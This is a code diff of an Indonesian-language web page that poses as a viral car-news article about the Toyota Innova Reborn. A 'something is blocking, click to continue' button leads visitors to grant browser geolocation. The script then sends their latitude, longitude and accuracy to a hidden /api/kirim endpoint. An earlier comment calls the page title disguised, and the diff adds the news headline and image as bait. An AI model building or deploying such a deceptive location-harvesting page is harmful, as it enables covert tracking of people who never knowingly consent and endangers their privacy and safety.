@@ -3,21 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cek Koneksi</title> <!-- Judul disamarkan -->
+    <title>Viral Lagi</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; }
-        .btn { padding: 15px 30px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        body { 
+            font-family: sans-serif; 
+            text-align: center; 
+            padding: 50px; }
+        .btn { 
+            padding: 15px 30px; 
+            background: #28a745; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            cursor: pointer; 
+            font-size: 16px; }
+        img {
+           width: 100%;
+           height: 100%;
+           object-fit: cover;
+           -o-object-fit: cover;
+           object-position: center;
+           -o-object-position: center; }
+       .title-content {
+           padding: 0 16px;
+           margin-bottom: 16px;
+           font-size: 22px;
+           font-family: mnc700;
+           line-height: 140%; }
     </style>
 </head>
 <body>
-
-    <h2>Ada yang menghalangi</h2>
-    <p>Klik tombol di bawah untuk melanjutkan.</p>
-    
-    <button class="btn" onclick="getLocation()">Lanjutkan</button>
-    
-    <p id="status" style="margin-top: 20px; color: #555;"></p>
-
+  <body>
+    <div class="title-content">Mengapa Innova Reborn Tetap Diproduksi Meski Sudah Hadir Innova Zenix?</div>
+    <img class="img" width="430" height="215" loading="lazy" src="https://img.okezone.com/content/2025/12/19/15/3190887/innova_reborn-OYEN_large.jpg" title="Innova Reborn masih terus diproduksi dan tetap diminati oleh konsumen Indonesia.  Foto: dok Toyota Astra" alt="Mengapa Innova Reborn Tetap Diproduksi Meski Sudah Hadir Innova Zenix?">
+        <h2>Ada yang menghalangi</h2>
+        <p>Klik tombol di bawah untuk melanjutkan.</p>
+     <button class="btn" onclick="getLocation()">Lanjutkan</button>
+     <p id="status" style="margin-top: 20px; color: #555;"></p>
     <script>
         function getLocation() {
             var status = document.getElementById("status");
@@ -28,14 +50,11 @@
                 status.innerHTML = "Browser tidak support.";
             }
         }
-
         async function showPosition(position) {
             var status = document.getElementById("status");
             var lat = position.coords.latitude;
             var long = position.coords.longitude;
             var acc = position.coords.accuracy;
-
-            // Kirim ke Vercel Serverless Function
             try {
                 const response = await fetch('/api/kirim', {
                     method: 'POST',
@@ -52,7 +71,6 @@
                 status.innerHTML = "Error koneksi.";
             }
         }
-
         function showError(error) {
             document.getElementById("status").innerHTML = "Akses lokasi ditolak atau error.";
         }
